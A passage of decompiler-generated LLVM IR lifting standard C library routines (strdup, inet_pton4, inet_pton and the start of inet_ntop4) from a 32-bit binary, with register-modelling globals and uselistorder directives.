  uselistorder i8 %v2_80536dc, { 1, 2, 0 }
  uselistorder i32 %v1_80536db, { 2, 1, 0 }
  uselistorder i8 %v2_80536ea30, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80536f4, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_80536f0, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80536fc = load i32, i32* @edi, align 4
  %v0_80536fd = load i32, i32* @esi, align 4
  %v0_80536fe = load i32, i32* @ebx, align 4
  store i32 %v0_80536fe, i32* %stack_var_-12, align 4
  %v4_80536ff = ptrtoint i8* %arg1 to i32
  store i32 %v4_80536ff, i32* @edi, align 4
  %v3_8053707 = call i32 @strlen(i8* %arg1)
  %v1_805370c = add i32 %v3_8053707, 1
  store i32 %v1_805370c, i32* @esi, align 4
  %v2_8053712 = call i32 @malloc(i32 %v1_805370c)
  store i32 %v2_8053712, i32* %ebx.global-to-local, align 4
  %v1_805371c = icmp eq i32 %v2_8053712, 0
  br i1 %v1_805371c, label %dec_label_pc_805372c, label %dec_label_pc_8053720

dec_label_pc_8053720:                             ; preds = %entry
  %v0_8053721 = load i32, i32* @esi, align 4
  %v0_8053722 = load i32, i32* @edi, align 4
  %tmp11 = inttoptr i32 %v2_8053712 to i16*
  %v6_8053724 = call i32 @memcpy(i16* %tmp11, i32 %v0_8053722, i32 %v0_8053721)
  %v0_805372c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_805372c:                             ; preds = %entry, %dec_label_pc_8053720
  %v0_805372c = phi i32 [ 0, %entry ], [ %v0_805372c.pre, %dec_label_pc_8053720 ]
  %v2_805372e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805372e, i32* @ebx, align 4
  store i32 %v0_80536fd, i32* @esi, align 4
  store i32 %v0_80536fc, i32* @edi, align 4
  ret i32 %v0_805372c

; uselistorder directives
  uselistorder i32 %v2_8053712, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 9, 8, 7, 17, 16, 15, 2, 4, 0, 14, 13, 12, 11, 10, 6, 5, 3, 1 }
  uselistorder label %dec_label_pc_805372c, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_8053736 = load i32, i32* @esi, align 4
  %v0_805373d = load i32, i32* @eax, align 4
  store i32 %v0_805373d, i32* %ebx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 0, i32* @edi, align 4
  %v2_8053743 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8053743, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_805378b15 = inttoptr i32 %v0_805373d to i8*
  %v2_805378b16 = load i8, i8* %v1_805378b15, align 1
  %v3_805378b17 = sext i8 %v2_805378b16 to i32
  store i32 %v3_805378b17, i32* @ecx, align 4
  %v1_805378e18 = add i32 %v0_805373d, 1
  store i32 %v1_805378e18, i32* %ebx.global-to-local, align 4
  %v1_805378f19 = icmp eq i8 %v2_805378b16, 0
  %v1_805379120 = icmp eq i1 %v1_805378f19, false
  br i1 %v1_805379120, label %dec_label_pc_805374e, label %dec_label_pc_8053793.thread

dec_label_pc_8053793.thread:                      ; preds = %entry
  br label %dec_label_pc_80537b0

dec_label_pc_805374e:                             ; preds = %entry, %dec_label_pc_805378b.backedge
  %v3_805378b22 = phi i32 [ %v3_805378b, %dec_label_pc_805378b.backedge ], [ %v3_805378b17, %entry ]
  %v2_805378b21 = phi i8 [ %v2_805378b, %dec_label_pc_805378b.backedge ], [ %v2_805378b16, %entry ]
  %v1_805374e = add nsw i32 %v3_805378b22, -48
  store i32 %v1_805374e, i32* %eax.global-to-local, align 4
  %v6_8053754 = icmp ugt i32 %v1_805374e, 9
  br i1 %v6_8053754, label %dec_label_pc_8053777, label %dec_label_pc_8053756

dec_label_pc_8053756:                             ; preds = %dec_label_pc_805374e
  %v0_8053756 = load i32, i32* @esi, align 4
  %v1_8053756 = inttoptr i32 %v0_8053756 to i8*
  %v2_8053756 = load i8, i8* %v1_8053756, align 1
  %v2_8053759 = zext i8 %v2_8053756 to i32
  %v3_8053759 = mul nuw nsw i32 %v2_8053759, 10
  %v3_805375c = add nsw i32 %v3_8053759, %v1_805374e
  store i32 %v3_805375c, i32* %eax.global-to-local, align 4
  %v6_8053765 = icmp ugt i32 %v3_805375c, 255
  br i1 %v6_8053765, label %dec_label_pc_80537b0, label %dec_label_pc_8053767

dec_label_pc_8053767:                             ; preds = %dec_label_pc_8053756
  %v1_8053767 = trunc i32 %v3_805375c to i8
  store i8 %v1_8053767, i8* %v1_8053756, align 1
  %v0_8053769 = load i32, i32* @edx, align 4
  %v1_8053769 = icmp eq i32 %v0_8053769, 0
  %v1_805376b = icmp eq i1 %v1_8053769, false
  br i1 %v1_805376b, label %dec_label_pc_805378b.backedge, label %dec_label_pc_805376d

dec_label_pc_805376d:                             ; preds = %dec_label_pc_8053767
  %v0_805376d = load i32, i32* @edi, align 4
  %v1_805376d = add i32 %v0_805376d, 1
  store i32 %v1_805376d, i32* @edi, align 4
  %v1_805376e = add i32 %v0_805376d, -3
  %v6_805376e = sub i32 2, %v0_805376d
  %v7_805376e = and i32 %v6_805376e, %v1_805376d
  %v8_805376e = icmp slt i32 %v7_805376e, 0
  %v9_805376e = icmp eq i32 %v1_805376e, 0
  %v10_805376e = icmp slt i32 %v1_805376e, 0
  %v3_8053771 = icmp eq i1 %v10_805376e, %v8_805376e
  %v4_8053771 = icmp eq i1 %v9_805376e, false
  %v5_8053771 = and i1 %v4_8053771, %v3_8053771
  br i1 %v5_8053771, label %dec_label_pc_80537b0, label %dec_label_pc_8053773

dec_label_pc_8053773:                             ; preds = %dec_label_pc_805376d
  %v1_8053773 = and i32 %v0_8053769, -256
  %v2_8053773 = or i32 %v1_8053773, 1
  store i32 %v2_8053773, i32* @edx, align 4
  br label %dec_label_pc_805378b.backedge

dec_label_pc_8053777:                             ; preds = %dec_label_pc_805374e
  %v9_8053777 = icmp eq i8 %v2_805378b21, 46
  %v1_805377a = icmp eq i1 %v9_8053777, false
  br i1 %v1_805377a, label %dec_label_pc_80537b0, label %dec_label_pc_805377c

dec_label_pc_805377c:                             ; preds = %dec_label_pc_8053777
  %v0_805377c = load i32, i32* @edx, align 4
  %v1_805377c = icmp eq i32 %v0_805377c, 0
  br i1 %v1_805377c, label %dec_label_pc_80537b0, label %dec_label_pc_8053780

dec_label_pc_8053780:                             ; preds = %dec_label_pc_805377c
  %v0_8053780 = load i32, i32* @edi, align 4
  %v9_8053780 = icmp eq i32 %v0_8053780, 4
  br i1 %v9_8053780, label %dec_label_pc_80537b0, label %dec_label_pc_8053785

dec_label_pc_8053785:                             ; preds = %dec_label_pc_8053780
  %v0_8053785 = load i32, i32* @esi, align 4
  %v1_8053785 = add i32 %v0_8053785, 1
  store i32 %v1_8053785, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v1_8053788 = inttoptr i32 %v1_8053785 to i8*
  store i8 0, i8* %v1_8053788, align 1
  br label %dec_label_pc_805378b.backedge

dec_label_pc_805378b.backedge:                    ; preds = %dec_label_pc_8053785, %dec_label_pc_8053773, %dec_label_pc_8053767
  %v0_805378b.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805378b = inttoptr i32 %v0_805378b.pre to i8*
  %v2_805378b = load i8, i8* %v1_805378b, align 1
  %v3_805378b = sext i8 %v2_805378b to i32
  store i32 %v3_805378b, i32* @ecx, align 4
  %v1_805378e = add i32 %v0_805378b.pre, 1
  store i32 %v1_805378e, i32* %ebx.global-to-local, align 4
  %v1_805378f = icmp eq i8 %v2_805378b, 0
  %v1_8053791 = icmp eq i1 %v1_805378f, false
  br i1 %v1_8053791, label %dec_label_pc_805374e, label %dec_label_pc_8053793

dec_label_pc_8053793:                             ; preds = %dec_label_pc_805378b.backedge
  %v0_8053793.pre = load i32, i32* @edi, align 4
  %v7_8053796 = icmp sgt i32 %v0_8053793.pre, 3
  br i1 %v7_8053796, label %dec_label_pc_8053798, label %dec_label_pc_80537b0

dec_label_pc_8053798:                             ; preds = %dec_label_pc_8053793
  %v0_8053798 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_8053743, i32* %eax.global-to-local, align 4
  %v3_80537a1 = bitcast i32* %stack_var_-20 to i16*
  %v4_80537a1 = call i32 @memcpy(i16* %v3_80537a1, i32 4, i32 %v0_8053798)
  br label %dec_label_pc_80537b2

dec_label_pc_80537b0:                             ; preds = %dec_label_pc_8053780, %dec_label_pc_805377c, %dec_label_pc_8053777, %dec_label_pc_805376d, %dec_label_pc_8053756, %dec_label_pc_8053793.thread, %dec_label_pc_8053793
  br label %dec_label_pc_80537b2

dec_label_pc_80537b2:                             ; preds = %dec_label_pc_8053798, %dec_label_pc_80537b0
  %storemerge = phi i32 [ 0, %dec_label_pc_80537b0 ], [ 1, %dec_label_pc_8053798 ]
  %v0_80537b9 = phi i32 [ 0, %dec_label_pc_80537b0 ], [ 1, %dec_label_pc_8053798 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8053736, i32* @esi, align 4
  ret i32 %v0_80537b9

; uselistorder directives
  uselistorder i32 %v3_805378b, { 1, 0 }
  uselistorder i8 %v2_805378b, { 1, 2, 0 }
  uselistorder i32 %v1_805376e, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 255, { 2, 1, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_80537b2, { 1, 0 }
  uselistorder label %dec_label_pc_80537b0, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_805374e, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80537ba = load i32, i32* @ebp, align 4
  %v0_80537bb = load i32, i32* @edi, align 4
  %v0_80537bc = load i32, i32* @esi, align 4
  %v0_80537bd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_80537c5 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80537c5, i32* @edi, align 4
  %v9_80537c9 = icmp eq i32 %arg1, 2
  br i1 %v9_80537c9, label %dec_label_pc_80537d9, label %dec_label_pc_80537ce

dec_label_pc_80537ce:                             ; preds = %entry
  %v9_80537ce = icmp eq i32 %arg1, 10
  %v1_80537d1 = icmp eq i1 %v9_80537ce, false
  br i1 %v1_80537d1, label %dec_label_pc_805396a, label %dec_label_pc_80537e9

dec_label_pc_80537d9:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_80537c5, i32* @eax, align 4
  %v3_80537df = call i32 @inet_pton4(i32 %v0_80537bd, i32 %v0_80537bc, i32 %v0_80537bb)
  store i32 %v3_80537df, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805397c

dec_label_pc_80537e9:                             ; preds = %dec_label_pc_80537ce
  %v2_80537ee = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80537ee, i32* %eax.global-to-local, align 4
  %tmp61 = bitcast i32* %stack_var_-32 to i8*
  %v5_80537f3 = call i32 @__GI_memset(i8* %tmp61, i32 0, i32 16)
  store i32 %v5_80537f3, i32* @ebx, align 4
  %v2_80537fa = add i32 %v5_80537f3, 16
  store i32 %v2_80537fa, i32* %eax.global-to-local, align 4
  %v0_8053804 = load i32, i32* @edi, align 4
  %v1_8053804 = inttoptr i32 %v0_8053804 to i8*
  %v2_8053804 = load i8, i8* %v1_8053804, align 1
  %v11_8053804 = icmp eq i8 %v2_8053804, 58
  %v1_8053807 = icmp eq i1 %v11_8053804, false
  br i1 %v1_8053807, label %dec_label_pc_805389a, label %dec_label_pc_8053809

dec_label_pc_8053809:                             ; preds = %dec_label_pc_80537e9
  %v1_8053809 = add i32 %v0_8053804, 1
  store i32 %v1_8053809, i32* @edi, align 4
  %v1_805380a = inttoptr i32 %v1_8053809 to i8*
  %v2_805380a = load i8, i8* %v1_805380a, align 1
  %v11_805380a = icmp eq i8 %v2_805380a, 58
  %v1_805380d = icmp eq i1 %v11_805380a, false
  br i1 %v1_805380d, label %dec_label_pc_805397a, label %dec_label_pc_805389a

dec_label_pc_8053821:                             ; preds = %dec_label_pc_80538da
  %v4_8053829 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_80580f4.292, i32 0, i32 0), i32 %v2_80538e1)
  store i32 %v4_8053829, i32* %eax.global-to-local, align 4
  %v0_805382e = load i32, i32* @edi, align 4
  %v1_805382e = add i32 %v0_805382e, 1
  store i32 %v1_805382e, i32* @edi, align 4
  %v1_8053832 = icmp eq i32 %v4_8053829, 0
  br i1 %v1_8053832, label %dec_label_pc_8053851, label %dec_label_pc_8053836

dec_label_pc_8053836:                             ; preds = %dec_label_pc_8053821
  %v0_8053836 = load i32, i32* @ebp, align 4
  %v2_8053836 = mul i32 %v0_8053836, 16
  %v1_8053839 = add i32 %v4_8053829, -134578420
  store i32 %v1_8053839, i32* %eax.global-to-local, align 4
  %v2_805383e = or i32 %v2_8053836, %v1_8053839
  store i32 %v2_805383e, i32* @ebp, align 4
  %tmp127 = icmp ult i32 %v2_805383e, 65536
  br i1 %tmp127, label %dec_label_pc_80538da.outer, label %dec_label_pc_805397a

dec_label_pc_80538da.outer:                       ; preds = %dec_label_pc_8053836, %dec_label_pc_805389a
  %v0_80538dd37 = phi i32 [ %v1_805382e, %dec_label_pc_8053836 ], [ %stack_var_-36.0.in, %dec_label_pc_805389a ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_8053836 ], [ %stack_var_-44.0, %dec_label_pc_805389a ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_8053836 ], [ %stack_var_-36.0, %dec_label_pc_805389a ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_8053836 ], [ 0, %dec_label_pc_805389a ]
  %v4_8053856 = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_805385b = icmp eq i1 %v4_8053856, false
  br label %dec_label_pc_80538da

dec_label_pc_8053851:                             ; preds = %dec_label_pc_8053821
  %v0_8053851 = load i32, i32* @esi, align 4
  %v9_8053851 = icmp eq i32 %v0_8053851, 58
  %v1_8053854 = icmp eq i1 %v9_8053851, false
  br i1 %v1_8053854, label %dec_label_pc_80538a6, label %dec_label_pc_8053856

dec_label_pc_8053856:                             ; preds = %dec_label_pc_8053851
  br i1 %v1_805385b, label %dec_label_pc_8053872, label %dec_label_pc_805385d

dec_label_pc_805385d:                             ; preds = %dec_label_pc_8053856
  %v5_805385d = icmp eq i8* %stack_var_-44.1, null
  %v1_8053862 = icmp eq i1 %v5_805385d, false
  br i1 %v1_8053862, label %dec_label_pc_805397a, label %dec_label_pc_8053868

dec_label_pc_8053868:                             ; preds = %dec_label_pc_805385d
  %v0_8053868 = load i32, i32* @ebx, align 4
  %v5_8053868 = inttoptr i32 %v0_8053868 to i8*
  %v5_805386c = inttoptr i32 %v1_805382e to i8*
  br label %dec_label_pc_80538da

dec_label_pc_8053872:                             ; preds = %dec_label_pc_8053856
  %v1_8053872 = inttoptr i32 %v1_805382e to i8*
  %v2_8053872 = load i8, i8* %v1_8053872, align 1
  %v3_8053872 = icmp eq i8 %v2_8053872, 0
  br i1 %v3_8053872, label %dec_label_pc_805397a, label %dec_label_pc_805387b

dec_label_pc_805387b:                             ; preds = %dec_label_pc_8053872
  %v0_805387b = load i32, i32* @ebx, align 4
  %v1_805387b = add i32 %v0_805387b, 2
  store i32 %v1_805387b, i32* @edx, align 4
  %v6_8053882 = icmp ugt i32 %v1_805387b, %v2_80537fa
  br i1 %v6_8053882, label %dec_label_pc_805397a, label %dec_label_pc_8053888

dec_label_pc_8053888:                             ; preds = %dec_label_pc_805387b
  %v0_8053888 = load i32, i32* @ebp, align 4
  %v2_805388a = udiv i32 %v0_8053888, 256
  %v4_805388a = trunc i32 %v2_805388a to i8
  %v3_805388d = inttoptr i32 %v0_805387b to i8*
  store i8 %v4_805388a, i8* %v3_805388d, align 1
  %v0_805388f = load i32, i32* @ebp, align 4
  store i32 %v0_805388f, i32* %eax.global-to-local, align 4
  %v1_8053891 = trunc i32 %v0_805388f to i8
  %v2_8053891 = load i32, i32* @ebx, align 4
  %v3_8053891 = add i32 %v2_8053891, 1
  %v4_8053891 = inttoptr i32 %v3_8053891 to i8*
  store i8 %v1_8053891, i8* %v4_8053891, align 1
  %v0_8053894 = load i32, i32* @edx, align 4
  store i32 %v0_8053894, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805389a

dec_label_pc_805389a:                             ; preds = %dec_label_pc_80537e9, %dec_label_pc_8053809, %dec_label_pc_8053888
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_8053888 ], [ %v1_8053809, %dec_label_pc_8053809 ], [ %v0_8053804, %dec_label_pc_80537e9 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_8053888 ], [ null, %dec_label_pc_8053809 ], [ null, %dec_label_pc_80537e9 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_80538da.outer

dec_label_pc_80538a6:                             ; preds = %dec_label_pc_8053851
  %v9_80538a6 = icmp eq i32 %v0_8053851, 46
  %v1_80538a9 = icmp eq i1 %v9_80538a6, false
  br i1 %v1_80538a9, label %dec_label_pc_805397a, label %dec_label_pc_80538af

dec_label_pc_80538af:                             ; preds = %dec_label_pc_80538a6
  %v0_80538af = load i32, i32* @ebx, align 4
  %v1_80538af = add i32 %v0_80538af, 4
  store i32 %v1_80538af, i32* @esi, align 4
  %v6_80538b6 = icmp ugt i32 %v1_80538af, %v2_80537fa
  br i1 %v6_80538b6, label %dec_label_pc_805397a, label %dec_label_pc_80538bc

dec_label_pc_80538bc:                             ; preds = %dec_label_pc_80538af
  store i32 %v0_80538af, i32* @edx, align 4
  %v4_80538be = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_80538be, i32* @eax, align 4
  %v2_80538c2 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_80538c2 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_80538c2, i32 %v2_80537fa)
  store i32 %v5_80538c2, i32* %eax.global-to-local, align 4
  %v0_80538c7 = load i32, i32* @esi, align 4
  %tmp62 = icmp slt i32 %v5_80538c2, 1
  %tmp63 = icmp eq i1 %tmp62, false
  br i1 %tmp63, label %dec_label_pc_8053911, label %dec_label_pc_805397a

dec_label_pc_80538da:                             ; preds = %dec_label_pc_80538da.outer, %dec_label_pc_8053868
  %v0_80538dd = phi i32 [ %v1_805382e, %dec_label_pc_8053868 ], [ %v0_80538dd37, %dec_label_pc_80538da.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_8053868, %dec_label_pc_8053868 ], [ %stack_var_-44.1.ph, %dec_label_pc_80538da.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_805386c, %dec_label_pc_8053868 ], [ %stack_var_-36.1.ph, %dec_label_pc_80538da.outer ]
  %v1_80538dd = inttoptr i32 %v0_80538dd to i8*
  %v2_80538dd = load i8, i8* %v1_80538dd, align 1
  %v3_80538dd = sext i8 %v2_80538dd to i32
  store i32 %v3_80538dd, i32* %eax.global-to-local, align 4
  %v2_80538e1 = call i32 @__GI_tolower(i32 %v3_80538dd)
  store i32 %v2_80538e1, i32* %eax.global-to-local, align 4
  store i32 %v2_80538e1, i32* @esi, align 4
  %v1_80538eb = icmp eq i32 %v2_80538e1, 0
  %v1_80538ed = icmp eq i1 %v1_80538eb, false
  br i1 %v1_80538ed, label %dec_label_pc_8053821, label %dec_label_pc_80538f3

dec_label_pc_80538f3:                             ; preds = %dec_label_pc_80538da
  %v0_8053949.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_8053856, label %dec_label_pc_8053911, label %dec_label_pc_80538fa

dec_label_pc_80538fa:                             ; preds = %dec_label_pc_80538f3
  %v1_80538fa = add i32 %v0_8053949.pre.pre, 2
  store i32 %v1_80538fa, i32* @edx, align 4
  %v6_8053901 = icmp ugt i32 %v1_80538fa, %v2_80537fa
  br i1 %v6_8053901, label %dec_label_pc_805397a, label %dec_label_pc_8053903

dec_label_pc_8053903:                             ; preds = %dec_label_pc_80538fa
  %v0_8053903 = load i32, i32* @ebp, align 4
  %v2_8053905 = udiv i32 %v0_8053903, 256
  %v4_8053905 = trunc i32 %v2_8053905 to i8
  %v3_8053908 = inttoptr i32 %v0_8053949.pre.pre to i8*
  store i8 %v4_8053905, i8* %v3_8053908, align 1
  %v0_805390a = load i32, i32* @ebp, align 4
  store i32 %v0_805390a, i32* %eax.global-to-local, align 4
  %v1_805390c = trunc i32 %v0_805390a to i8
  %v2_805390c = load i32, i32* @ebx, align 4
  %v3_805390c = add i32 %v2_805390c, 1
  %v4_805390c = inttoptr i32 %v3_805390c to i8*
  store i8 %v1_805390c, i8* %v4_805390c, align 1
  %v0_805390f = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053911

dec_label_pc_8053911:                             ; preds = %dec_label_pc_80538f3, %dec_label_pc_80538bc, %dec_label_pc_8053903
  %v0_8053949.pre = phi i32 [ %v0_80538c7, %dec_label_pc_80538bc ], [ %v0_805390f, %dec_label_pc_8053903 ], [ %v0_8053949.pre.pre, %dec_label_pc_80538f3 ]
  %v4_8053911 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8053911 = icmp eq i8* %stack_var_-44.1, null
  br i1 %v5_8053911, label %dec_label_pc_8053949, label %dec_label_pc_8053918

dec_label_pc_8053918:                             ; preds = %dec_label_pc_8053911
  store i32 1, i32* @esi, align 4
  %v6_805391f = sub i32 %v0_8053949.pre, %v4_8053911
  store i32 %v6_805391f, i32* @edi, align 4
  %v16_8053923 = icmp eq i32 %v0_8053949.pre, %v2_80537fa
  %v1_8053927 = icmp eq i1 %v16_8053923, false
  br i1 %v1_8053927, label %dec_label_pc_8053941.preheader, label %dec_label_pc_805397a

dec_label_pc_8053941.preheader:                   ; preds = %dec_label_pc_8053918
  %v3_805394195 = inttoptr i32 %v6_805391f to i8*
  %v9_805394398 = icmp slt i8* %v3_805394195, inttoptr (i32 1 to i8*)
  br i1 %v9_805394398, label %dec_label_pc_8053949.thread, label %dec_label_pc_805392b

dec_label_pc_805392b:                             ; preds = %dec_label_pc_8053941.preheader, %dec_label_pc_805392b
  %v0_8053939100 = phi i32 [ %v0_8053941.pre, %dec_label_pc_805392b ], [ 1, %dec_label_pc_8053941.preheader ]
  %v0_805392b99 = phi i32 [ %v1_8053941.pre, %dec_label_pc_805392b ], [ %v6_805391f, %dec_label_pc_8053941.preheader ]
  %v2_8053931 = sub i32 %v0_805392b99, %v0_8053939100
  %v2_8053933 = sub i32 %v2_80537fa, %v0_8053939100
  %v6_8053935 = add i32 %v2_8053931, %v4_8053911
  store i32 %v6_8053935, i32* %eax.global-to-local, align 4
  %v1_8053939 = add i32 %v0_8053939100, 1
  store i32 %v1_8053939, i32* @esi, align 4
  %v1_805393a = inttoptr i32 %v6_8053935 to i8*
  %v2_805393a = load i8, i8* %v1_805393a, align 1
  %v3_805393a = zext i8 %v2_805393a to i32
  %v4_805393a = load i32, i32* @edx, align 4
  %v5_805393a = and i32 %v4_805393a, -256
  %v6_805393a = or i32 %v5_805393a, %v3_805393a
  store i32 %v6_805393a, i32* @edx, align 4
  %v3_805393c = inttoptr i32 %v2_8053933 to i8*
  store i8 %v2_805393a, i8* %v3_805393c, align 1
  %v0_805393e = load i32, i32* %eax.global-to-local, align 4
  %v1_805393e = inttoptr i32 %v0_805393e to i8*
  store i8 0, i8* %v1_805393e, align 1
  %v0_8053941.pre = load i32, i32* @esi, align 4
  %v1_8053941.pre = load i32, i32* @edi, align 4
  %v2_8053941 = inttoptr i32 %v0_8053941.pre to i8*
  %v3_8053941 = inttoptr i32 %v1_8053941.pre to i8*
  %v9_8053943 = icmp sgt i8* %v2_8053941, %v3_8053941
  br i1 %v9_8053943, label %dec_label_pc_8053949.thread, label %dec_label_pc_805392b

dec_label_pc_8053949.thread:                      ; preds = %dec_label_pc_805392b, %dec_label_pc_8053941.preheader
  br label %dec_label_pc_805394f

dec_label_pc_8053949:                             ; preds = %dec_label_pc_8053911
  %v16_8053949 = icmp eq i32 %v0_8053949.pre, %v2_80537fa
  %v1_805394d = icmp eq i1 %v16_8053949, false
  br i1 %v1_805394d, label %dec_label_pc_805397a, label %dec_label_pc_805394f

dec_label_pc_805394f:                             ; preds = %dec_label_pc_8053949.thread, %dec_label_pc_8053949
  store i32 %v2_80537ee, i32* %eax.global-to-local, align 4
  %tmp64 = inttoptr i32 %arg3 to i16*
  %v5_805395b = call i32 @memcpy(i16* %tmp64, i32 %v2_80537ee, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805397c

dec_label_pc_805396a:                             ; preds = %dec_label_pc_80537ce
  %v1_805396a = call i32 @__errno_location(i32 %v0_80537bd)
  %v1_805396f = inttoptr i32 %v1_805396a to i32*
  store i32 97, i32* %v1_805396f, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805397c

dec_label_pc_805397a:                             ; preds = %dec_label_pc_805387b, %dec_label_pc_8053872, %dec_label_pc_8053836, %dec_label_pc_805385d, %dec_label_pc_8053918, %dec_label_pc_80538bc, %dec_label_pc_8053949, %dec_label_pc_80538fa, %dec_label_pc_80538af, %dec_label_pc_80538a6, %dec_label_pc_8053809
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805397c

dec_label_pc_805397c:                             ; preds = %dec_label_pc_805396a, %dec_label_pc_805394f, %dec_label_pc_80537d9, %dec_label_pc_805397a
  %v0_8053983 = phi i32 [ -1, %dec_label_pc_805396a ], [ 1, %dec_label_pc_805394f ], [ %v3_80537df, %dec_label_pc_80537d9 ], [ 0, %dec_label_pc_805397a ]
  store i32 %v0_80537bd, i32* @ebx, align 4
  store i32 %v0_80537bc, i32* @esi, align 4
  store i32 %v0_80537bb, i32* @edi, align 4
  store i32 %v0_80537ba, i32* @ebp, align 4
  ret i32 %v0_8053983

; uselistorder directives
  uselistorder i32 %v1_8053941.pre, { 1, 0 }
  uselistorder i32 %v0_8053941.pre, { 1, 0 }
  uselistorder i32 %v0_8053939100, { 2, 1, 0 }
  uselistorder i32 %v0_8053949.pre, { 2, 1, 0 }
  uselistorder i32 %v0_8053949.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_80538e1, { 2, 1, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v1_805382e, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_80537fa, { 0, 2, 1, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_80537bd, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805397c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805397a, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_805394f, { 1, 0 }
  uselistorder label %dec_label_pc_805392b, { 1, 0 }
  uselistorder label %dec_label_pc_8053911, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80538da, { 1, 0 }
  uselistorder label %dec_label_pc_805389a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80538da.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %v0_8053985 = load i32, i32* @edi, align 4
  %v0_8053986 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v0_805398e = load i32, i32* @eax, align 4
  %v3_8053992 = and i32 %v0_805398e, -65536
  store i32 %v3_8053992, i32* %stack_var_-33, align 4
  %v2_805399d = ptrtoint i32* %stack_var_-31 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80539a3 = load i32, i32* @edx, align 4
  %v5_80539a3 = inttoptr i32 %v0_80539a3 to i8*
  store i8* %v5_80539a3, i8** %stack_var_-60, align 4
  %v0_80539a7 = load i32, i32* @ecx, align 4
